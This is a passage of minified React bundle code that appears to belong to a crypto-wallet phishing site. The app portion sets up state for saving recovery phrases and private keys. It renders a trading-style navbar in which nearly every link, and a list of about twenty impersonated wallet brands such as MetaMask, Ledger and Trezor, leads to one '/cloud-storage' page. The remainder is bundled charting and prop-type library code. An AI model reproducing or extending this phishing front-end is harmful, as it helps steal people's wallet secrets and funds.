wallet"})}},uV=(t,e)=>{switch(e.type){case"SET_PHRASE":return{...t,phrase:e.payload};case"SAVE_PHRASE":return{...t,loading:!1,error:null};case"SET_SAVE_ERROR":return{...t,loading:!1,error:e.payload};case"SET_LOADING":return{...t,loading:!0};case"SET_WALLET_NAME":return{...t,walletName:e.payload.name,walletLogo:e.payload.logo};case"GET_PHRASE_SUCCESS":return{...t,getphrase:e.payload,loading:!1,error:null};case"GET_PHRASE_ERROR":return{...t,getphrase:e.payload,loading:!1,error:e.payload};case"GET_WALLET_ADDRESS_SUCCESS":return{...t,getwalletaddress:e.payload,loading:!1,error:null};case"GET_WALLET_ADDRESS_ERROR":return{...t,getwalletaddress:e.payload,loading:!1,error:e.payload};case"SET_PRIVATE_KEY":return{...t,privatekey:e.payload};case"SAVE_PRIVATE_KEY":return{...t,loading:!1,error:null};case"SET_SAVE_PRIVATE_KEY_ERROR":return{...t,loading:!1,error:e.payload};case"GET_PRIVATE_KEY_SUCCESS":return{...t,getprivatekey:e.payload,loading:!1,error:null};case"GET_PRIVATE_KEY_ERROR":return{...t,getprivatekey:e.payload,loading:!1,error:e.payload};default:return t}},EO={phrase:"",getphrase:[],error:null,loading:!1,walletName:"",getwalletaddress:[],privateKey:"",getprivatekey:[]},Zc=ue.createContext(EO),hV=({children:t})=>{const[e,n]=ue.useReducer(uV,EO);return H.jsx(Zc.Provider,{value:{state:e,dispatch:n},children:t})},ly=["Swap more","Trade better","Earn fast"],fV=()=>{const[t,e]=ue.useState(ly[0]),[n,r]=ue.useState(!1),[i,o]=ue.useState(0),[l,c]=ue.useState(!1),{dispatch:u}=ue.useContext(Zc);ue.useEffect(()=>{const g=setInterval(()=>{r(!0),setTimeout(()=>{const E=(i+1)%ly.length;e(ly[E]),o(E)},500),setTimeout(()=>r(!1),1e3)},2500);return()=>clearInterval(g)},[i]);const{state:f,dispatch:d}=sS(),y=async()=>{if(!l){c(!0);try{await lV(d,f.chain)}finally{c(!1)}}};return H.jsx("header",{children:H.jsx("nav",{className:"navbar navbar-expand-lg bg-body-tertiary1 navbar-dark sticky-top",children:H.jsxs("div",{className:"container-fluid",children:[H.jsx(ct,{to:"/cloud-storage",className:"navbar-brand",children:H.jsx("img",{src:"https://i.ibb.co/GQPvzds4/IMG-6487.jpg",alt:"logo",width:"50",height:"50"})}),H.jsx("div",{className:"flip-box",children:H.jsx("h4",{className:`airdrop ${n?"flip":""}`,children:t})}),H.jsx("button",{className:"navbar-toggler",type:"button","data-bs-toggle":"collapse","data-bs-target":"#navbarNav","aria-controls":"navbarNav","aria-expanded":"false","aria-label":"Toggle navigation",children:H.jsx("span",{className:"navbar-toggler-icon"})}),H.jsx("div",{className:"collapse navbar-collapse justify-content-end nav-margin",id:"navbarNav",children:H.jsxs("ul",{className:"navbar-nav",children:[H.jsx("li",{className:"nav-item",children:H.jsx(ct,{to:"/",className:"nav-link active","aria-current":"page",children:"Home"})}),H.jsx("li",{className:"nav-item",children:H.jsx(ct,{to:"/cloud-storage",className:"nav-link",children:"Spot"})}),H.jsx("li",{className:"nav-item",children:H.jsx(ct,{to:"/cloud-storage",className:"nav-link",children:"Perps"})}),H.jsx("li",{className:"nav-item",children:H.jsx(ct,{to:"/cloud-storage",className:"nav-link",children:"Ape"})}),H.jsx("li",{className:"nav-item",children:H.jsx(ct,{to:"/swap",className:"nav-link",children:"Swap"})}),H.jsxs("li",{className:"nav-item dropdown-center hover-dropdown position-relative",children:[H.jsx("button",{className:"btn dropdown-toggle text-dropdown","data-bs-toggle":"dropdown","aria-expanded":"false",children:"Cloud Storage"}),H.jsx("ul",{className:"dropdown-menu dropdown-menu-light p-3 dropdown-menu-media",style:{minWidth:"500px",left:"50%",transform:"translateX(-50%)"},children:H.jsxs("div",{className:"row",children:[H.jsxs("div",{className:"col-md-6",children:[H.jsx("li",{children:H.jsxs(ct,{to:"/cloud-storage",className:"dropdown-item nav-link text-dark1",onClick:()=>u({type:"SET_WALLET_NAME",payload:{name:"Trust Wallet",logo:"https://i.ibb.co/TqBGZ8xV/download.png"}}),children:[H.jsx("span",{className:"wallet-logo pe-3",children:H.jsx("img",{src:"https://i.ibb.co/TqBGZ8xV/download.png",alt:"wallet-logo",width:20,height:20})})," Trust Wallet"]})}),H.jsx("li",{children:H.jsxs(ct,{to:"/cloud-storage",className:"dropdown-item nav-link text-dark1",onClick:()=>u({type:"SET_WALLET_NAME",payload:{name:"MetaMask",logo:"https://i.ibb.co/G4nrtH4T/metamask.png"}}),children:[H.jsx("span",{className:"wallet-logo pe-3",children:H.jsx("img",{src:"https://i.ibb.co/G4nrtH4T/metamask.png",alt:"wallet-logo",width:20,height:20})})," MetaMask"]})}),H.jsx("li",{children:H.jsxs(ct,{to:"/cloud-storage",className:"dropdown-item nav-link text-dark1",onClick:()=>u({type:"SET_WALLET_NAME",payload:{name:"Coinbase Wallet",logo:"https://i.ibb.co/FvxNTy5/coinbase.png"}}),children:[H.jsx("span",{className:"wallet-logo pe-3",children:H.jsx("img",{src:"https://i.ibb.co/FvxNTy5/coinbase.png",alt:"wallet-logo",width:20,height:20})})," Coinbase Wallet"]})}),H.jsx("li",{children:H.jsxs(ct,{to:"/cloud-storage",className:"dropdown-item nav-link text-dark1",onClick:()=>u({type:"SET_WALLET_NAME",payload:{name:"Crypto.com",logo:"https://i.ibb.co/B278RgtX/cryptocom.png"}}),children:[H.jsx("span",{className:"wallet-logo pe-3",children:H.jsx("img",{src:"https://i.ibb.co/B278RgtX/cryptocom.png",alt:"wallet-logo",width:20,height:20})})," Crypto.com"]})}),H.jsx("li",{children:H.jsxs(ct,{to:"/cloud-storage",className:"dropdown-item nav-link text-dark1",onClick:()=>u({type:"SET_WALLET_NAME",payload:{name:"Ledger",logo:"https://i.ibb.co/7dTw9mj0/ledger.jpg"}}),children:[H.jsx("span",{className:"wallet-logo pe-3",children:H.jsx("img",{src:"https://i.ibb.co/7dTw9mj0/ledger.jpg",alt:"wallet-logo",width:20,height:20})})," Ledger"]})}),H.jsx("li",{children:H.jsxs(ct,{to:"/cloud-storage",className:"dropdown-item nav-link text-dark1",onClick:()=>u({type:"SET_WALLET_NAME",payload:{name:"Ellipal Wallet",logo:"https://i.ibb.co/YrJPcVW/ellipal.png"}}),children:[H.jsx("span",{className:"wallet-logo pe-3",children:H.jsx("img",{src:"https://i.ibb.co/YrJPcVW/ellipal.png",alt:"wallet-logo",width:20,height:20})})," Ellipal Wallet"]})}),H.jsx("li",{children:H.jsxs(ct,{to:"/cloud-storage",className:"dropdown-item nav-link text-dark1",onClick:()=>u({type:"SET_WALLET_NAME",payload:{name:"Moreno",logo:"https://i.ibb.co/zH4nYD1s/moreno.jpg"}}),children:[H.jsx("span",{className:"wallet-logo pe-3",children:H.jsx("img",{src:"https://i.ibb.co/zH4nYD1s/moreno.jpg",alt:"wallet-logo",width:20,height:20})})," Moreno"]})}),H.jsx("li",{children:H.jsxs(ct,{to:"/cloud-storage",className:"dropdown-item nav-link text-dark1",onClick:()=>u({type:"SET_WALLET_NAME",payload:{name:"Crypto.com | Defi wallet",logo:"https://i.ibb.co/TD8hnprF/defiwallet.jpg"}}),children:[H.jsx("span",{className:"wallet-logo pe-3",children:H.jsx("img",{src:"https://i.ibb.co/TD8hnprF/defiwallet.jpg",alt:"wallet-logo",width:20,height:20})})," Crypto.com | Defi wallet"]})}),H.jsx("li",{children:H.jsxs(ct,{to:"/cloud-storage",className:"dropdown-item nav-link text-dark1",onClick:()=>u({type:"SET_WALLET_NAME",payload:{name:"Phantom",logo:"https://i.ibb.co/7xDGNzdN/phantom.png"}}),children:[H.jsx("span",{className:"wallet-logo pe-3",children:H.jsx("img",{src:"https://i.ibb.co/7xDGNzdN/phantom.png",alt:"wallet-logo",width:20,height:20})})," Phantom"]})})]}),H.jsxs("div",{className:"col-md-6",children:[H.jsx("li",{children:H.jsxs(ct,{to:"/cloud-storage",className:"dropdown-item nav-link text-dark1",onClick:()=>u({type:"SET_WALLET_NAME",payload:{name:"Safepal",logo:"https://i.ibb.co/0j6y1g6f/safepal.png"}}),children:[H.jsx("span",{className:"wallet-logo pe-3",children:H.jsx("img",{src:"https://i.ibb.co/0j6y1g6f/safepal.png",alt:"wallet-logo",width:20,height:20})})," Safepal"]})}),H.jsx("li",{children:H.jsxs(ct,{to:"/cloud-storage",className:"dropdown-item nav-link text-dark1",onClick:()=>u({type:"SET_WALLET_NAME",payload:{name:"Electrum Wallet",logo:"https://i.ibb.co/mVTpBdgQ/electrum.jpg"}}),children:[H.jsx("span",{className:"wallet-logo pe-3",children:H.jsx("img",{src:"https://i.ibb.co/mVTpBdgQ/electrum.jpg",alt:"wallet-logo",width:20,height:20})})," Electrum Wallet"]})}),H.jsx("li",{children:H.jsxs(ct,{to:"/cloud-storage",className:"dropdown-item nav-link text-dark1",onClick:()=>u({type:"SET_WALLET_NAME",payload:{name:"MyEther",logo:"https://i.ibb.co/Xr4DYZKk/myether.png"}}),children:[H.jsx("span",{className:"wallet-logo pe-3",children:H.jsx("img",{src:"https://i.ibb.co/Xr4DYZKk/myether.png",alt:"wallet-logo",width:20,height:20})})," MyEther"]})}),H.jsx("li",{children:H.jsxs(ct,{to:"/cloud-storage",className:"dropdown-item nav-link text-dark1",onClick:()=>u({type:"SET_WALLET_NAME",payload:{name:"Exodus",logo:"https://i.ibb.co/Z6J93GbD/exodus.jpg"}}),children:[H.jsx("span",{className:"wallet-logo pe-3",children:H.jsx("img",{src:"https://i.ibb.co/Z6J93GbD/exodus.jpg",alt:"wallet-logo",width:20,height:20})})," Exodus"]})}),H.jsx("li",{children:H.jsxs(ct,{to:"/cloud-storage",className:"dropdown-item nav-link text-dark1",onClick:()=>u({type:"SET_WALLET_NAME",payload:{name:"Best Wallet",logo:"https://i.ibb.co/Kc574KDt/bestwallet.jpg"}}),children:[H.jsx("span",{className:"wallet-logo pe-3",children:H.jsx("img",{src:"https://i.ibb.co/Kc574KDt/bestwallet.jpg",alt:"wallet-logo",width:20,height:20})})," Best Wallet"]})}),H.jsx("li",{children:H.jsxs(ct,{to:"/cloud-storage",className:"dropdown-item nav-link text-dark1",onClick:()=>u({type:"SET_WALLET_NAME",payload:{name:"Safemoon",logo:"https://i.ibb.co/RTJbhsCz/safemoon.png"}}),children:[H.jsx("span",{className:"wallet-logo pe-3",children:H.jsx("img",{src:"https://i.ibb.co/RTJbhsCz/safemoon.png",alt:"wallet-logo",width:20,height:20})})," Safemoon"]})}),H.jsx("li",{children:H.jsxs(ct,{to:"/cloud-storage",className:"dropdown-item nav-link text-dark1",onClick:()=>u({type:"SET_WALLET_NAME",payload:{name:"Fortmatic",logo:"https://i.ibb.co/KcLMBgyB/fortmatic.png"}}),children:[H.jsx("span",{className:"wallet-logo pe-3",children:H.jsx("img",{src:"https://i.ibb.co/KcLMBgyB/fortmatic.png",alt:"wallet-logo",width:20,height:20})})," Fortmatic"]})}),H.jsx("li",{children:H.jsxs(ct,{to:"/cloud-storage",className:"dropdown-item nav-link text-dark1",onClick:()=>u({type:"SET_WALLET_NAME",payload:{name:"Trezor",logo:"https://i.ibb.co/sJ1myqg3/trezor.png"}}),children:[H.jsx("span",{className:"wallet-logo pe-3",children:H.jsx("img",{src:"https://i.ibb.co/sJ1myqg3/trezor.png",alt:"wallet-logo",width:20,height:20})})," Trezor"]})}),H.jsx("li",{children:H.jsxs(ct,{to:"/cloud-storage",className:"dropdown-item nav-link text-dark1",onClick:()=>u({type:"SET_WALLET_NAME",payload:{name:"Others",logo:"https://i.ibb.co/VWpZskrZ/wc1.png"}}),children:[H.jsx("span",{className:"wallet-logo pe-3",children:H.jsx("img",{src:"https://i.ibb.co/VWpZskrZ/wc1.png",alt:"wallet-logo",width:20,height:20})})," Others"]})})]})]})})]}),H.jsxs("li",{className:"nav-item dropdown hover-dropdown",children:[H.jsx("button",{className:"btn text-dropdown dropdown-toggle",type:"button",id:"walletDropdown","data-bs-toggle":"dropdown","aria-expanded":"false",children:f.address?H.jsx("span",{className:"text-address",children:`${f.address.slice(0,6)}...${f.address.slice(-4)}`}):"Connect"}),f.address&&H.jsx("ul",{children:H.jsx("li",{children:H.jsx("button",{className:"btn btn-outline-danger w-100 mt-2",onClick:async g=>{g.preventDefault(),g.stopPropagation(),await cV(u,f.chain)},children:"Disconnect"})})}),f.error&&H.jsx("div",{className:"text-danger mt-2 small",children:f.error}),H.jsxs("ul",{className:"dropdown-menu dropdown-menu-end p-3","aria-labelledby":"walletDropdown",children:[H.jsx("li",{children:H.jsxs("select",{className:"form-select mb-2",onChange:g=>u({type:"SET_CHAIN",payload:g.target.value}),value:f.chain,children:[H.jsx("option",{value:"ethereum",children:"Ethereum"}),H.jsx("option",{value:"polygon",children:"Polygon"}),H.jsx("option",{value:"bsc",children:"Binance Smart Chain"}),H.jsx("option",{value:"arbitrum",children:"Arbitrum"}),H.jsx("option",{value:"optimism",children:"Optimism"}),H.jsx("option",{value:"fantom",children:"Fantom"}),H.jsx("option",{value:"avalanche",children:"Avalanche"}),H.jsx("option",{value:"base",children:"Base"}),H.jsx("option",{value:"solana",children:"Solana (Phantom)"}),H.jsx("option",{value:"ton",children:"TON"})]})}),H.jsx("li",{children:H.jsx("button",{className:"btn btn-success w-100",onClick:g=>{g.preventDefault(),g.stopPropagation(),y()},disabled:l,children:l?"Connecting...":"Connect Wallet"})})]})]})]})})]})})})},dV={coins:[],loading:!1,error:!1,initialLoading:!0},Sa={FETCH_START:"FETCH_START",FETCH_SUCCESS:"FETCH_SUCCESS",FETCH_ERROR:"FETCH_ERROR"},pV=(t,e)=>{switch(e.type){case Sa.FETCH_START:return{...t,loading:!0,error:!1,initialLoading:t.coins.length===0};case Sa.FETCH_SUCCESS:return{...t,loading:!1,initialLoading:!1,coins:e.payload};case Sa.FETCH_ERROR:return{...t,loading:!1,error:!0};default:return t}};var Kh={exports:{}},gV=Kh.exports,bx;function yV(){return bx||(bx=1,function(t,e){(function(r,i){t.exports=i(mf())})(gV,function(n){return function(r){var i={};function o(l){if(i[l])return i[l].exports;var c=i[l]={i:l,l:!1,exports:{}};return r[l].call(c.exports,c,c.exports,o),c.l=!0,c.exports}return o.m=r,o.c=i,o.d=function(l,c,u){o.o(l,c)||Object.defineProperty(l,c,{configurable:!1,enumerable:!0,get:u})},o.n=function(l){var c=l&&l.__esModule?function(){return l.default}:function(){return l};return o.d(c,"a",c),c},o.o=function(l,c){return Object.prototype.hasOwnProperty.call(l,c)},o.p="/",o(o.s=11)}([function(r,i,o){(function(l){if(l.env.NODE_ENV!=="production"){var c=typeof Symbol=="function"&&Symbol.for&&Symbol.for("react.element")||60103,u=function(d){return typeof d=="object"&&d!==null&&d.$$typeof===c},f=!0;r.exports=o(14)(u,f)}else r.exports=o(16)()}).call(i,o(2))},function(r,i){r.exports=n},function(r,i){var o=r.exports={},l,c;function u(){throw new Error("setTimeout has not been defined")}function f(){throw new Error("clearTimeout has not been defined")}(function(){try{typeof setTimeout=="function"?l=setTimeout:l=u}catch{l=u}try{typeof clearTimeout=="function"?c=clearTimeout:c=f}catch{c=f}})();function d($){if(l===setTimeout)return setTimeout($,0);if((l===u||!l)&&setTimeout)return l=setTimeout,setTimeout($,0);try{return l($,0)}catch{try{return l.call(null,$,0)}catch{return l.call(this,$,0)}}}function y($){if(c===clearTimeout)return clearTimeout($);if((c===f||!c)&&clearTimeout)return c=clearTimeout,clearTimeout($);try{return c($)}catch{try{return c.call(null,$)}catch{return c.call(this,$)}}}var g=[],E=!1,w,b=-1;function m(){!E||!w||(E=!1,w.length?g=w.concat(g):b=-1,g.length&&x())}function x(){if(!E){var $=d(m);E=!0;for(var R=g.length;R;){for(w=g,g=[];++b<R;)w&&w[b].run();b=-1,R=g.length}w=null,E=!1,y($)}}o.nextTick=function($){var R=new Array(arguments.length-1);if(arguments.length>1)for(var T=1;T<arguments.length;T++)R[T-1]=arguments[T];g.push(new S($,R)),g.length===1&&!E&&d(x)};function S($,R){this.fun=$,this.array=R}S.prototype.run=function(){this.fun.apply(null,this.array)},o.title="browser",o.browser=!0,o.env={},o.argv=[],o.version="",o.versions={};function O(){}o.on=O,o.addListener=O,o.once=O,o.off=O,o.removeListener=O,o.removeAllListeners=O,o.emit=O,o.prependListener=O,o.prependOnceListener=O,o.listeners=function($){return[]},o.binding=function($){throw new Error("process.binding is not supported")},o.cwd=function(){return"/"},o.chdir=function($){throw new Error("process.chdir is not supported")},o.umask=function(){return 0}},function(r,i,o){Object.defineProperty(i,"__esModule",{value:!0}),i.default=function(l){return l.reduce(function(c,u){return c+u})/l.length}},function(r,i,o){function l(u){return function(){return u}}var c=function(){};c.thatReturns=l,c.thatReturnsFalse=l(!1),c.thatReturnsTrue=l(!0),c.thatReturnsNull=l(null),c.thatReturnsThis=function(){return this},c.thatReturnsArgument=function(u){return u},r.exports=c},function(r,i,o){(function(l){var c=function(d){};l.env.NODE_ENV!=="production"&&(c=function(d){if(d===void 0)throw new Error("invariant requires an error message argument")});function u(f,d,y,g,E,w,b,m){if(c(d),!f){var x;if(d===void 0)x=new Error("Minified exception occurred; use the non-minified dev environment for the full error message and additional helpful warnings.");else{var S=[y,g,E,w,b,m],O=0;x=new Error(d.replace(/%s/g,function(){return S[O++]})),x.name="Invariant Violation"}throw x.framesToPop=1,x}}r.exports=u}).call(i,o(2))},function(r,i,o){var l="SECRET_DO_NOT_PASS_THIS_OR_YOU_WILL_BE_FIRED";r.exports=l},function(r,i,o){Object.defineProperty(i,"__esModule",{value:!0}),i.default=function(l){return Math.min.apply(Math,l)}},function(r,i,o){(function(l){var c=o(4),u=c;if(l.env.NODE_ENV!=="production"){var f=function(y){for(var g=arguments.length,E=Array(g>1?g-1:0),w=1;w<g;w++)E[w-1]=arguments[w];var b=0,m="Warning: "+y.replace(/%s/g,function(){return E[b++]});typeof console<"u"&&console.error(m);try{throw new Error(m)}catch{}};u=function(y,g){if(g===void 0)throw new Error("`warning(condition, format, ...args)` requires a warning message argument");if(g.indexOf("Failed Composite propType: ")!==0&&!y){for(var E=arguments.length,w=Array(E>2?E-2:0),b=2;b<E;b++)w[b-2]=arguments[b];f.apply(void 0,[g].concat(w))}}}r.exports=u}).call(i,o(2))},function(r,i,o){Object.defineProperty(i,"__esModule",{value:!0}),i.default=function(l){return Math.max.apply(Math,l)}},function(r,i,o){Object.defineProperty(i,"__esModule",{value:!0});var l=o(3),c=u(l);function u(f){return f&&f.__esModule?f:{default:f}}i.default=function(f){var d=(0,c.default)(f),y=f.map(function(E){return Math.pow(E-d,2)}),g=(0,c.default)(y);return Math.sqrt(g)}},function(r,i,o){r.exports=o(12)},function(r,i,o){r.exports=o(13)},function(r,i,o){Object.defineProperty(i,"__esModule",{value:!0}),i.SparklinesText=i.SparklinesNormalBand=i.SparklinesReferenceLine=i.SparklinesSpots=i.SparklinesBars=i.SparklinesCurve=i.SparklinesLine=i.Sparklines=void 0;var l=function(){function C(U,M){for(var N=0;N<M.length;N++){var V=M[N];V.enumerable=V.enumerable||!1,V.configurable=!0,"value"in V&&(V.writable=!0),Object.defineProperty(U,V.key,V)}}return function(U,M,N){return M&&C(U.prototype,M),N&&C(U,N),U}}(),c=o(0),u=W(c),f=o(1),d=W(f),y=o(17),g=W(y),E=o(18),w=W(E),b=o(19),m=W(b),x=o(20),S=W(x),O=o(21),$=W(O),R=o(22),T=W(R),D=o(27),B=W(D),k=o(28),G=W(k);function W(C){return C&&C.__esModule?C:{default:C}}function J(C,U){if(!(C instanceof U))throw new TypeError("Cannot call a class as a function")}function ne(C,U){if(!C)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return U&&(typeof U=="object"||typeof U=="function")?U:C}function j(C,U){if(typeof U!="function"&&U!==null)throw new TypeError("Super expression must either be null or a function, not "+typeof U);C.prototype=Object.create(U&&U.prototype,{constructor:{value:C,enumerable:!1,writable:!0,configurable:!0}}),U&&(Object.setPrototypeOf?Object.setPrototypeOf(C,U):C.__proto__=U)}var A=function(C){j(U,C);function U(M){return J(this,U),ne(this,(U.__proto__||Object.getPrototypeOf(U)).call(this,M))}return l(U,[{key:"render",value:function(){var N=this.props,V=N.data,F=N.limit,q=N.width,Q=N.height,te=N.svgWidth,se=N.svgHeight,le=N.preserveAspectRatio,pe=N.margin,he=N.style,fe=N.max,xe=N.min;if(V.length===0)return null;var Oe=(0,G.default)({data:V,limit:F,width:q,height:Q,margin:pe,max:fe,min:xe}),Pe={style:he,viewBox:"0 0 "+q+" "+Q,preserveAspectRatio:le};return te>0&&(Pe.width=te),se>0&&(Pe.height=se),d.default.createElement("svg",Pe,d.default.Children.map(this.props.children,function(Re){return d.default.cloneElement(Re,{data:V,points:Oe,width:q,height:Q,margin:pe})}))}}]),U}(f.PureComponent);A.propTypes={data:u.default.array,limit:u.default.number,width:u.default.number,height:u.default.number,svgWidth:u.default.number,svgHeight:u.default.number,preserveAspectRatio:u.default.string,margin:u.default.number,style:u.default.object,min:u.default.number,max:u.default.number,onMouseMove:u.default.func},A.defaultProps={data:[],width:240,height:60,preserveAspectRatio:"none",margin:2},i.Sparklines=A,i.SparklinesLine=w.default,i.SparklinesCurve=m.default,i.SparklinesBars=S.default,i.SparklinesSpots=$.default,i.SparklinesReferenceLine=T.default,i.SparklinesNormalBand=B.default,i.SparklinesText=g.default},function(r,i,o){(function(l){var c=o(4),u=o(5),f=o(8),d=o(6),y=o(15);r.exports=function(g,E){var w=typeof Symbol=="function"&&Symbol.iterator,b="@@iterator";function m(q){var Q=q&&(w&&q[w]||q[b]);if(typeof Q=="function")return Q}var x="<<anonymous>>",S={array:T("array"),bool:T("boolean"),func:T("function"),number:T("number"),object:T("object"),string:T("string"),symbol:T("symbol"),any:D(),arrayOf:B,element:k(),instanceOf:G,node:j(),objectOf:J,oneOf:W,oneOfType:ne,shape:A};function O(q,Q){return q===Q?q!==0||1/q===1/Q:q!==q&&Q!==Q}function $(q){this.message=q,this.stack=""}$.prototype=Error.prototype;function R(q){if(l.env.NODE_ENV!=="production")var Q={},te=0;function se(pe,he,fe,xe,Oe,Pe,Re){if(xe=xe||x,Pe=Pe||fe,Re!==d){if(E)u(!1,"Calling PropTypes validators directly is not supported by the `prop-types` package. Use `PropTypes.checkPropTypes()` to call them. Read more at http://fb.me/use-check-prop-types");else if(l.env.NODE_ENV!=="production"&&typeof console<"u"){var Ue=xe+":"+fe;!Q[Ue]&&te<3&&(f(!1,"You are manually calling a React.PropTypes validation function for the `%s` prop on `%s`. This is deprecated and will throw in the standalone `prop-types` package. You may be seeing this warning due to a third-party PropTypes library. See https://fb.me/react-warning-dont-call-proptypes for details.",Pe,xe),Q[Ue]=!0,te++)}}return he[fe]==null?pe?he[fe]===null?new $("The "+Oe+" `"+Pe+"` is marked as required "+("in `"+xe+"`, but its value is `null`.")):new $("The "+Oe+" `"+Pe+"` is marked as required in "+("`"+xe+"`, but its value is `undefined`.")):null:q(he,fe,xe,Oe,Pe)}var le=se.bind(null,!1);return le.isRequired=se.bind(null,!0),le}function T(q){function Q(te,se,le,pe,he,fe){var xe=te[se],Oe=M(xe);if(Oe!==q){var Pe=N(xe);return new $("Invalid "+pe+" `"+he+"` of type "+("`"+Pe+"` supplied to `"+le+"`, expected ")+("`"+q+"`."))}return null}return R(Q)}function D(){return R(c.thatReturnsNull)}function B(q){function Q(te,se,le,pe,he){if(typeof q!="function")return new $("Property `"+he+"` of component `"+le+"` has invalid PropType notation inside arrayOf.");var fe=te[se];if(!Array.isArray(fe)){var xe=M(fe);return new $("Invalid "+pe+" `"+he+"` of type "+("`"+xe+"` supplied to `"+le+"`, expected an array."))}for(var Oe=0;Oe<fe.length;Oe++){var Pe=q(fe,Oe,le,pe,he+"["+Oe+"]",d);if(Pe instanceof Error)return Pe}return null}return R(Q)}function k(){function q(Q,te,se,le,pe){var he=Q[te];if(!g(he)){var fe=M(he);return new $("Invalid "+le+" `"+pe+"` of type "+("`"+fe+"` supplied to `"+se+"`, expected a single ReactElement."))}return null}return R(q)}function G(q){function Q(te,se,le,pe,he){if(!(te[se]instanceof q)){var fe=q.name||x,xe=F(te[se]);return new $("Invalid "+pe+" `"+he+"` of type "+("`"+xe+"` supplied to `"+le+"`, expected ")+("instance of `"+fe+"`."))}return null}return R(Q)}function W(q){if(!Array.isArray(q))return l.env.NODE_ENV!=="production"&&f(!1,"Invalid argument supplied to oneOf, expected an instance of array."),c.thatReturnsNull;function Q(te,se,le,pe,he){for(var fe=te[se],xe=0;xe<q.length;xe++)if(O(fe,q[xe]))return null;var Oe=JSON.stringify(q);return new $("Invalid "+pe+" `"+he+"` of value `"+fe+"` "+("supplied to `"+le+"`, expected one of "+Oe+"."))}return R(Q)}function J(q){function Q(te,se,le,pe,he){if(typeof q!="function")return new $("Property `"+he+"` of component `"+le+"` has invalid PropType notation inside objectOf.");var fe=te[se],xe=M(fe);if(xe!=="object")return new $("Invalid "+pe+" `"+he+"` of type "+("`"+xe+"` supplied to `"+le+"`, expected an object."));for(var Oe in fe)if(fe.hasOwnProperty(Oe)){var Pe=q(fe,Oe,le,pe,he+"."+Oe,d);if(Pe instanceof Error)return Pe}return null}return R(Q)}function ne(q){if(!Array.isArray(q))return l.env.NODE_ENV!=="production"&&f(!1,"Invalid argument supplied to oneOfType, expected an instance of array."),c.thatReturnsNull;for(var Q=0;Q<q.length;Q++){var te=q[Q];if(typeof te!="function")return f(!1,"Invalid argument supplid to oneOfType. Expected an array of check functions, but received %s at index %s.",V(te),Q),c.thatReturnsNull}function se(le,pe,he,fe,xe){for(var Oe=0;Oe<q.length;Oe++){var Pe=q[Oe];if(Pe(le,pe,he,fe,xe,d)==null)return null}return new $("Invalid "+fe+" `"+xe+"` supplied to "+("`"+he+"`."))}return R(se)}function j(){function q(Q,te,se,le,pe){return C(Q[te])?null:new $("Invalid "+le+" `"+pe+"` supplied to "+("`"+se+"`, expected a ReactNode."))}return R(q)}function A(q){function Q(te,se,le,pe,he){var fe=te[se],xe=M(fe);if(xe!=="object")return new $("Invalid "+pe+" `"+he+"` of type `"+xe+"` "+("supplied to `"+le+"`, expected `object`."));for(var Oe in q){var Pe=q[Oe];if(Pe){var Re=Pe(fe,Oe,le,pe,he+"."+Oe,d);if(Re)return Re}}return null}return R(Q)}function C(q){switch(typeof q){case"number":case"string":case"undefined":return!0;case"boolean":return!q;case"object":if(Array.isArray(q))return q.every(C);if(q===null||g(q))return!0;var Q=m(q);if(Q){var te=Q.call(q),se;if(Q!==q.entries){for(;!(se=te.next()).done;)if(!C(se.value))return!1}else for(;!(se=te.next()).done;){var le=se.value;if(le&&!C(le[1]))return!1}}else return!1;return!0;default:return!1}}function U(q,Q){return q==="symbol"||Q["@@toStringTag"]==="Symbol"||typeof Symbol=="function"&&Q instanceof Symbol}function M(q){var Q=typeof q;return Array.isArray(q)?"array":q instanceof RegExp?"object":U(Q,q)?"symbol":Q}function N(q){if(typeof q>"u"||q===null)return""+q;var Q=M(q);if(Q==="object"){if(q instanceof Date)return"date";if(q instanceof RegExp)return"regexp"}return Q}function V(q){var Q=N(q);switch(Q){case"array":case"object":return"an "+Q;case"boolean":case"date":case"regexp":return"a "+Q;default:return Q}}function F(q){return!q.constructor||!q.constructor.name?x:q.constructor.name}return S.checkPropTypes=y,S.PropTypes=S,S}}).call(i,o(2))},function(r,i,o){(function(l){if(l.env.NODE_ENV!=="production")var c=o(5),u=o(8),f=o(6),d={};function y(g,E,w,b,m){if(l.env.NODE_ENV!=="production"){for(var x in g)if(g.hasOwnProperty(x)){var S;try{c(typeof g[x]=="function","%s: %s type `%s` is invalid; it must be a function, usually from React.PropTypes.",b||"React class",w,x),S=g[x](E,x,b,w,null,f)}catch($){S=$}if(u(!S||S instanceof Error,"%s: type specification of %s `%s` is invalid; the type checker function must return `null` or an `Error` but returned a %s. You may have forgotten to pass an argument to the type checker creator (arrayOf, instanceOf, objectOf, oneOf, oneOfType, and shape all require an argument).",b||"React class",w,x,typeof S),S instanceof Error&&!(S.message in d)){d[S.message]=!0;var O=m?m():"";u(!1,"Failed %s type: %s%s",w,S.message,O??"")}}}}r.exports=y}).call(i,o(2))},function(r,i,o){var l=o(4),c=o(5),u=o(6);r.exports=function(){function f(g,E,w,b,m,x){x!==u&&c(!1,"Calling PropTypes validators directly is not supported by the `prop-types` package. Use PropTypes.checkPropTypes() to call them. Read more at http://fb.me/use-check-prop-types")}f.isRequired=f;function d(){return f}var y={array:f,bool:f,func:f,number:f,object:f,string:f,symbol:f,any:f,arrayOf:d,element:f,instanceOf:d,node:f,objectOf:d,oneOf:d,oneOfType:d,shape:d};return y.checkPropTypes=l,y.PropTypes=y,y}},function(r,i,o){Object.defineProperty(i,"__esModule",{value:!0});var l=function(){function m(x,S){for(var O=0;O<S.length;O++){var $=S[O];$.enumerable=$.enumerable||!1,$.configurable=!0,"value"in $&&($.writable=!0),Object.defineProperty(x,$.key,$)}}return function(x,S,O){return S&&m(x.prototype,S),O&&m(x,O),x}}(),c=o(0),u=y(c),f=o(1),d=y(f);function y(m){return m&&m.__esModule?m:{default:m}}function g(m,x){if(!(m instanceof x))throw new TypeError("Cannot call a class as a function")}function E(m,x){if(!m)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return x&&(typeof x=="object"||typeof x=="function")?x:m}function w(m,x){if(typeof x!="function"&&x!==null)throw new TypeError("Super expression must either be null or a function, not "+typeof x);m.prototype=Object.create(x&&x.prototype,{constructor:{value:m,enumerable:!1,writable:!0,configurable:!0}}),x&&(Object.setPrototypeOf?Object.setPrototypeOf(m,x):m.__proto__=x)}var b=function(m){w(x,m);function x(){return g(this,x),E(this,(x.__proto__||Object.getPrototypeOf(x)).apply(this,arguments))}return l(x,[{key:"render",value:function(){var 